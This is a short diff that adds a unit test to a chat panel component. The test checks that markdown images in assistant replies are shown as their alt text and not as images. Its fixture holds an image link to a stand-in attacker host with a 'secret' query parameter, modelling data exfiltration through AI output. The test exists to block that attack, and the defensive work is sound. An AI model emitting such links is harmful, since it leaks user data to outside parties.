@@ -587,6 +587,19 @@ describe('ChatPanel', () => {
     expect(wrapper.text()).toContain('J’ai trouvé 12 lignes.')
   })
 
+  it('renders images of assistant replies as their alt text', () => {
+    chatState.messages.value = [{
+      id: 'a1',
+      role: 'assistant',
+      parts: [{ type: 'text', text: 'Résultat ![graphe](https://evil.example/?d=secret)' }],
+    }]
+    const wrapper = mountPanel('resource-1')
+
+    expect(wrapper.find('img').exists()).toBe(false)
+    expect(wrapper.html()).not.toContain('evil.example')
+    expect(wrapper.text()).toContain('graphe')
+  })
+
   it('maps tool types to French labels and first-person summaries', () => {
     chatState.messages.value = [{
       id: 'a1',
